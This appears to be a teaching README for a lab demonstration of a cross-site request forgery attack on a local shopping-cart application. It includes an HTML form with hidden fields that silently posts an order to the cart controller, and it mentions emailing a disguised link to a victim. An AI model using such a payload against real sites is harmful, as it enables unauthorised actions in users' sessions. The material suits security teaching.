# Example: CSRF Attack

The sole purpose of this web application is to provide a manipulated HTML page.

We can access this page via the following link:

``` 
URL: http://localhost:8080/index.html
```

In a real attack, we would disguise the link and send it in an email 
to the victim.

What the user cannot see is that the website contains an 
**HTML form with hidden fields** that can be **sent to the shopping cart application**.

```HTML
    <form method="post" action="https://localhost:8443/controller">
        <input type="hidden" name="name" value="Hacker's Book"/>
        <input type="hidden" name="quantity" value="666"/>
        <input type="submit" name="action" value="Add" />
    </form>
```

*Egon Teiniker, 2017-2025, GPL v3.0*
